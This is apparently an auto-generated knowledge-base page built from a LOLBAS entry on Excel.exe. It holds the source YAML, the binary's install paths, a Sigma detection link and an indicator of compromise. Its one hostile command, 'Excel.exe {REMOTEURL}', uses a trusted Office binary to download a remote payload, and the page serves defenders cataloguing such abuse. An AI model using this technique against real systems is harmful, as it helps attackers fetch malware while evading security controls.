---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Excel.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `excel.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Excel.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Excel.exe](../../tools/windows/excel.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | excel.exe |
| name | Excel.exe |
| type | tool |
| source | lolbas |
| url | https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@reegun21'
  Person: Reegun J (OCBC Bank)
Author: Reegun J (OCBC Bank)
Commands:
- Category: Download
  Command: Excel.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache.
Created: 2019-07-19
Description: Microsoft Office binary
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_office.yml
- IOC: Suspicious Office application Internet/network traffic
Full_Path:
- Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Excel.exe
- Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Excel.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office16\Excel.exe
- Path: C:\Program Files\Microsoft Office\Office16\Excel.exe
- Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\Excel.exe
- Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\Excel.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office15\Excel.exe
- Path: C:\Program Files\Microsoft Office\Office15\Excel.exe
- Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\Excel.exe
- Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\Excel.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office14\Excel.exe
- Path: C:\Program Files\Microsoft Office\Office14\Excel.exe
- Path: C:\Program Files (x86)\Microsoft Office\Office12\Excel.exe
- Path: C:\Program Files\Microsoft Office\Office12\Excel.exe
- Path: C:\Program Files\Microsoft Office\Office12\Excel.exe
Name: Excel.exe
Resources:
- Link: https://twitter.com/reegun21/status/1150032506504151040
- Link: https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Excel.yml
```

## Detection / Analysis Notes

```text
IOC: Suspicious Office application Internet/network traffic
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_office.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_office.yml
- IOC: Suspicious Office application Internet/network traffic
```
